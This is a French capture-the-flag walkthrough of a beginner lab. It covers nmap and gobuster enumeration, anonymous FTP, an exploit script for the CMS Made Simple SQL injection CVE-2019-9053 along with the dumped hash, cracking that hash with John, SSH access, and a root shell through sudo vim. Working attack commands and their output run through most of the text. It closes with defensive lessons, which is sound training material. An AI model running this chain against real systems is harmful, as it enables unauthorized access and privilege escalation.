Easy CTF

FTP AnonymeSQLiCVE-2019-9053 JohnSSHsudo vim

CTF débutant axé sur l'énumération réseau, l'exploitation SQLi dans un CMS, le cracking de hash et l'élévation via sudo vim.

Reconnaissance — Nmap

bash 
nmap -sC -sV lab.thm

Ports découverts :

  • 21/tcp — FTP vsftpd 3.0.3 (connexion anonyme autorisée)
  • 80/tcp — Apache 2.4.18
  • 2222/tcp — SSH (port non standard)

Phase 1 — Énumération FTP

bash 
ftp lab.thm
# Login: anonymous / (vide)
ftp> cd pub
ftp> get ForMitch.txt

Contenu de ForMitch.txt : l'utilisateur Mitch a un mot de passe faible identique pour le système.

Phase 2 — Énumération Web

bash 
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -u http://lab.thm

Répertoire /simple découvert → CMS Made Simple v2.2.8.

Phase 3 — SQLi sur CMS Made Simple

La version 2.2.8 est vulnérable à CVE-2019-9053 (SQLi time-based blind). On utilise un script Python :

bash 
python3 updated_46635.py -u http://lab.thm/simple
output 
Username : mitch
Salt     : 1dac0d92e9fa6bb2
Password : 0c01f4468bd75d7a84c7eb73846e8d96
Email    : admin@admin.com

On craque le hash MD5+salt avec John :

bash 
# Format du hash dans hash.txt :
mitch:0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2

john --format=dynamic_4 \
  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Mot de passe : secret

Phase 4 — Accès SSH

bash 
ssh mitch@lab.thm -p 2222
# Password: secret
User flag : G00d j0b, keep up!

Phase 5 — Escalade de privilèges

bash 
sudo -l
User mitch may run : (root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/bash'

vim peut exécuter des commandes shell avec :!commande. On obtient un shell root :

Root flag : W3ll d0n3. You made it!

Leçons apprises

  • Le FTP anonyme ne doit jamais contenir d'informations sensibles
  • Toujours mettre à jour les CMS — CVE-2019-9053 existe depuis 2019
  • sudo NOPASSWD sur un éditeur (vim, nano, less) = privesc immédiat via :!bash
  • Préférer des mots de passe forts et uniques pour chaque service
